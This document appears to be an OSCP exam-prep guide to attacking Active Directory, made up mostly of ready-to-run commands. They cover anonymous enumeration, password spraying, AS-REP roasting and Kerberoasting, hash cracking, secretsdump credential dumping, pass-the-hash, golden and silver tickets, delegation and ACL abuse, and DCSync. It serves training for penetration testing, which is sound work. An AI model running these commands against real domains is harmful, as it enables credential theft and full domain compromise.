# OSCP Enhanced Active Directory Guide

## Table of Contents
- [Domain Discovery and Initial Access](#domain-discovery-and-initial-access)
- [Advanced Enumeration Techniques](#advanced-enumeration-techniques)
- [Authentication Attacks Mastery](#authentication-attacks-mastery)
- [Post-Exploitation and Lateral Movement](#post-exploitation-and-lateral-movement)
- [Advanced Privilege Escalation](#advanced-privilege-escalation)
- [TJ Null AD Scenarios](#tj-null-ad-scenarios)
- [OSCP AD Exam Strategy](#oscp-ad-exam-strategy)

## Domain Discovery and Initial Access

### External Domain Discovery
```bash
# DNS enumeration for domain discovery
dig <target> ANY
dig -t SRV _ldap._tcp.<domain>
dig -t SRV _kerberos._tcp.<domain>
dig -t SRV _gc._tcp.<domain>

# Subdomain enumeration
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<target> -fs 1234

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Google dorking for domain info
site:<target> filetype:pdf
site:<target> "password" 
site:<target> inurl:admin
```

### Initial Domain Footprint
```bash
# Check for domain-joined systems
nmap -p 88,389,636,3268,3269,53 <target-range>

# SMB enumeration for domain discovery
crackmapexec smb <target-range> --gen-relay-list relay.txt
crackmapexec smb <target-range>

# NetBIOS discovery
nbtscan -r <target-range>
```

### Anonymous/Null Session Enumeration Advanced
```bash
# Multiple null session attempts
smbclient -L //<target> -N
smbclient -L //<target> -U ""
smbclient -L //<target> -U ""%""
smbclient -L //<target> -U "guest"%""

# RPC null session comprehensive
rpcclient -U "" -N <target>
# Commands inside rpcclient:
srvinfo
enumdomusers
enumdomgroups  
enumprivs
queryuser <RID>
querygroupmem <group-RID>
lsaquery
lsaenumprivs

# LDAP anonymous bind enumeration
ldapsearch -h <target> -x -b "" -s base
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=person)"
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=computer)"
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=group)"
```

## Advanced Enumeration Techniques

### Domain Controller Identification
```bash
# Multiple methods for DC discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
nslookup -type=SRV _kerberos._tcp.dc._msdcs.<domain>
nslookup -type=SRV _kpasswd._tcp.<domain>

# Using impacket
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -dc-ip <dc-ip> <domain>/

# PowerShell equivalent (if you have a Windows box)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
```

### User Enumeration Mastery
```bash
# Username enumeration via SMB
enum4linux -U <target>
enum4linux -u "" -p "" -U <target>

# Kerberos user enumeration (if port 88 open)
kerbrute userenum -d <domain> /usr/share/seclists/Usernames/Names/names.txt --dc <dc-ip>

# LDAP user enumeration with detailed info
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=user)" sAMAccountName userPrincipalName

# Generate common usernames
echo -e "administrator\nadmin\nservice\nsql\niis\nexchange\ntest\nguest" > users.txt

# RID cycling for user discovery
for i in {500..1100}; do rpcclient -U "" -N <target> -c "queryuser $i" 2>/dev/null; done
```

### Service Account Discovery
```bash
# Find service accounts via SPN enumeration  
ldapsearch -h <target> -x -b "DC=domain,DC=com" "servicePrincipalName=*" sAMAccountName servicePrincipalName

# Using impacket
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip <dc-ip> <domain>/ -request -no-pass

# Look for common service account patterns
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(sAMAccountName=svc*)"
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(sAMAccountName=service*)"
```

### BloodHound Data Collection Enhanced
```bash
# Remote collection from Linux
bloodhound-python -u <username> -p <password> -d <domain> -dc <dc-ip> -ns <dc-ip> -c all --zip

# Alternative collection methods
bloodhound-python -u <username> -p <password> -d <domain> -dc <dc-ip> -c DCOnly
bloodhound-python -u <username> -p <password> -d <domain> -dc <dc-ip> -c Group,LocalAdmin,Session,Trusts

# From Windows with credentials
.\SharpHound.exe -c all --zipfilename bloodhound.zip --domain <domain> --domaincontroller <dc-ip>

# Stealth collection (fewer LDAP queries)
.\SharpHound.exe -c DCOnly --stealth
```

## Authentication Attacks Mastery

### Password Spraying Techniques
```bash
# CrackMapExec password spray
crackmapexec smb <target> -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success

# Kerbrute password spray (faster, less detection)
kerbrute passwordspray -d <domain> users.txt Password123! --dc <dc-ip>

# Impacket SMB spray  
for user in $(cat users.txt); do 
  echo "Testing $user:Password123!"
  smbclient -L //<target> -U "$user%Password123!" 2>/dev/null && echo "[+] Valid: $user:Password123!"
done

# LDAP authentication testing
for user in $(cat users.txt); do
  ldapsearch -h <dc-ip> -x -D "$user@domain.com" -w "Password123!" -b "DC=domain,DC=com" "(objectclass=user)" dn 2>/dev/null && echo "[+] Valid LDAP: $user:Password123!"
done
```

### Common Password Patterns for Spraying
```bash
# Season/Year based passwords
echo -e "Password123!\nPassword2024!\nPassword2025!\nWinter2024!\nSpring2025!" > passwords.txt

# Company name based (replace CompanyName)
echo -e "CompanyName123!\nCompanyName2024!\ncompanyname123!" >> passwords.txt

# Default patterns
echo -e "Welcome123!\nChangeme123!\nP@ssw0rd\nP@ssword123!" >> passwords.txt
```

### ASREPRoast Attack Enhanced
```bash
# Find users with "Do not require Kerberos preauthentication"
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass

# Target specific user
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain>/<username>:<password> -request -format hashcat -outputfile asrep_hashes.txt

# Alternative format for John
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain>/ -usersfile users.txt -format john -outputfile asrep_hashes.txt

# Crack the hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

### Kerberoasting Enhanced
```bash
# Request service tickets for all SPNs
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>/<username>:<password> -request -format hashcat -outputfile kerberoast_hashes.txt -dc-ip <dc-ip>

# Target specific SPN
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>/<username>:<password> -request-user <target-user> -format hashcat -dc-ip <dc-ip>

# Show available SPNs without requesting tickets
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>

# Crack service tickets
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force

# Rule-based cracking for service accounts
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Post-Exploitation and Lateral Movement

### Credential Dumping Techniques
```bash
# Secretsdump - dump all hashes
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<username>:<password>@<dc-ip>

# Dump specific user
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<username>:<password>@<dc-ip> -just-dc-user Administrator

# NTDS.dit dumping
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<username>:<password>@<dc-ip> -just-dc-ntlm

# Local SAM dump (if local admin on target)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <username>:<password>@<target> -sam
```

### Pass-the-Hash Techniques
```bash
# PSExec with NTLM hash
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<username>@<target> -hashes <lm-hash>:<nt-hash>

# WMIExec with hash (stealthier)
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py <domain>/<username>@<target> -hashes <lm-hash>:<nt-hash>

# SMBExec with hash
python3 /usr/share/doc/python3-impacket/examples/smbexec.py <domain>/<username>@<target> -hashes <lm-hash>:<nt-hash>

# CrackMapExec for multiple targets
crackmapexec smb <target-range> -u <username> -H <nt-hash> --local-auth
crackmapexec smb <target-range> -u <username> -H <nt-hash>
```

### OverPass-the-Hash (NTLM to Kerberos)
```bash
# Get TGT with NTLM hash
python3 /usr/share/doc/python3-impacket/examples/getTGT.py <domain>/<username> -hashes <lm-hash>:<nt-hash>

# Set the ticket
export KRB5CCNAME=<username>.ccache

# Use Kerberos authentication
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<username>@<target> -k -no-pass
```

### Golden Ticket Attack
```bash
# 1. Get krbtgt hash (requires high privileges)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<admin-user>:<password>@<dc-ip>

# 2. Extract domain SID
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py <domain>/<username>:<password>@<dc-ip>

# 3. Create golden ticket
python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash <krbtgt-hash> -domain <domain> -domain-sid <domain-sid> <fake-username>

# 4. Use the ticket
export KRB5CCNAME=<fake-username>.ccache
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<fake-username>@<dc-ip> -k -no-pass
```

### Silver Ticket Attack
```bash
# 1. Get service account hash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<username>:<password>@<target>

# 2. Create silver ticket for specific service (e.g., CIFS)
python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash <service-hash> -domain <domain> -domain-sid <domain-sid> -spn cifs/<target-fqdn> <fake-username>

# 3. Use the ticket
export KRB5CCNAME=<fake-username>.ccache
python3 /usr/share/doc/python3-impacket/examples/smbclient.py <domain>/<fake-username>@<target> -k -no-pass
```

## Advanced Privilege Escalation

### Delegation Attacks

#### Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
crackmapexec ldap <dc-ip> -u <username> -p <password> --trusted-for-delegation

# Alternative LDAP query
ldapsearch -h <dc-ip> -x -D "<username>@<domain>" -w <password> -b "DC=domain,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# If you compromise a machine with unconstrained delegation:
# Monitor for TGTs using Rubeus or similar tools
```

#### Constrained Delegation
```bash
# Find constrained delegation
crackmapexec ldap <dc-ip> -u <username> -p <password> --constrained-delegation

# Exploit with impacket
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn <target-spn> -impersonate <target-user> <domain>/<service-account>:<password>
export KRB5CCNAME=<target-user>.ccache
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<target-user>@<target> -k -no-pass
```

### ACL-Based Attacks
```bash
# Use BloodHound to identify:
# - GenericAll permissions
# - GenericWrite permissions  
# - WriteOwner permissions
# - WriteDACL permissions
# - AllExtendedRights permissions

# Example: Change user password with GenericAll
python3 /usr/share/doc/python3-impacket/examples/changepasswd.py <domain>/<attacker-user>:<password> -newpass <new-password> <target-user>@<dc-ip>

# Example: Add SPN for Kerberoasting with GenericWrite
python3 /usr/share/doc/python3-impacket/examples/addspn.py <domain>/<username>:<password> -user <target-user> -spn <fake-spn> <dc-ip>
```

### DCSync Attack
```bash
# Dump domain hashes (requires Replicating Directory Changes permissions)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<username>:<password>@<dc-ip>

# Dump specific user
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<username>:<password>@<dc-ip> -just-dc-user krbtgt

# Check if user has DCSync permissions
crackmapexec ldap <dc-ip> -u <username> -p <password> --bloodhound -ns <dc-ip> -c DCSync
```

## TJ Null AD Scenarios

### Common TJ Null AD Attack Paths

#### Path 1: SMB Null Session → User Enum → Password Spray → Kerberoast
```bash
# 1. Null session enumeration
enum4linux -U <target>

# 2. Generate username list
echo -e "administrator\nservice\nsql\niis\nexchange" > users.txt

# 3. Password spray
kerbrute passwordspray -d <domain> users.txt Password123! --dc <dc-ip>

# 4. Kerberoast with found credentials
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>/<found-user>:<found-password> -request -format hashcat
```

#### Path 2: Web App → Domain Creds → Lateral Movement
```bash
# 1. Exploit web application to get initial access
# 2. Find domain credentials in web.config, registry, or memory
# 3. Use credentials for domain enumeration
crackmapexec smb <target-range> -u <found-user> -p <found-password>

# 4. Escalate privileges and move laterally
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<found-user>:<found-password>@<target>
```

#### Path 3: ASREPRoast → Password Crack → BloodHound → ACL Abuse
```bash
# 1. Find ASREPRoast vulnerable users
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat

# 2. Crack the hash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# 3. Collect BloodHound data
bloodhound-python -u <cracked-user> -p <cracked-password> -d <domain> -dc <dc-ip> -c all

# 4. Analyze attack paths and exploit ACLs
```

### TJ Null AD Box Difficulty Indicators

#### Easy AD Boxes:
- [ ] Null/anonymous SMB access reveals users
- [ ] Common/weak passwords work (Password123!, Welcome123!)
- [ ] Clear service accounts with SPNs
- [ ] Simple privilege escalation path
- [ ] Obvious BloodHound attack path

#### Medium AD Boxes:
- [ ] Requires enumeration from multiple sources
- [ ] Need to crack hashes for initial access
- [ ] Multiple privilege escalation vectors
- [ ] Chain of attacks required
- [ ] Some red herrings/rabbit holes

#### Hard AD Boxes:
- [ ] Limited initial access vectors
- [ ] Strong passwords require advanced cracking
- [ ] Complex delegation or ACL scenarios
- [ ] Multiple domains or trusts
- [ ] Advanced post-exploitation required

## OSCP AD Exam Strategy

### Time Allocation for AD Set (40 points)
```
Hour 1: Initial enumeration and user discovery
Hour 2: Authentication attacks (password spray, ASREPRoast)  
Hour 3: Kerberoasting and hash cracking
Hour 4: Lateral movement and privilege escalation
Hour 5: Domain controller compromise
Hour 6: Cleanup and documentation
```

### AD Methodology Checklist
- [ ] **Domain Discovery** (30 minutes)
  - [ ] Identify domain controllers
  - [ ] Enumerate domain name
  - [ ] Check for null sessions
  
- [ ] **User Enumeration** (45 minutes)  
  - [ ] SMB null sessions
  - [ ] RPC enumeration
  - [ ] LDAP anonymous bind
  - [ ] Generate username lists
  
- [ ] **Authentication Attacks** (2 hours)
  - [ ] Password spraying with common passwords
  - [ ] ASREPRoast attack
  - [ ] Check for default credentials
  
- [ ] **Post-Authentication** (2 hours)
  - [ ] Kerberoasting
  - [ ] BloodHound collection and analysis
  - [ ] Credential dumping
  - [ ] Lateral movement planning
  
- [ ] **Privilege Escalation** (1 hour)
  - [ ] ACL abuse paths
  - [ ] Delegation attacks
  - [ ] DCSync capabilities

### Essential AD Commands Cheat Sheet
```bash
# Quick domain discovery
nmap -p 88,389,636,3268 <target-range>

# User enumeration
enum4linux -U <target>
kerbrute userenum -d <domain> users.txt --dc <dc-ip>

# Password spray
kerbrute passwordspray -d <domain> users.txt Password123! --dc <dc-ip>

# ASREPRoast
python3 GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat

# Kerberoast
python3 GetUserSPNs.py <domain>/<user>:<pass> -request -format hashcat

# Hash cracking
hashcat -m 18200 asrep.hash rockyou.txt  # ASREPRoast
hashcat -m 13100 kerb.hash rockyou.txt   # Kerberoast

# Lateral movement
crackmapexec smb <range> -u <user> -p <pass>
python3 psexec.py <domain>/<user>:<pass>@<target>

# Domain admin
python3 secretsdump.py <domain>/<user>:<pass>@<dc-ip>
```

Remember: Active Directory in OSCP is about methodical enumeration and understanding common attack paths. Practice the fundamentals until they're second nature, then focus on chaining techniques together efficiently!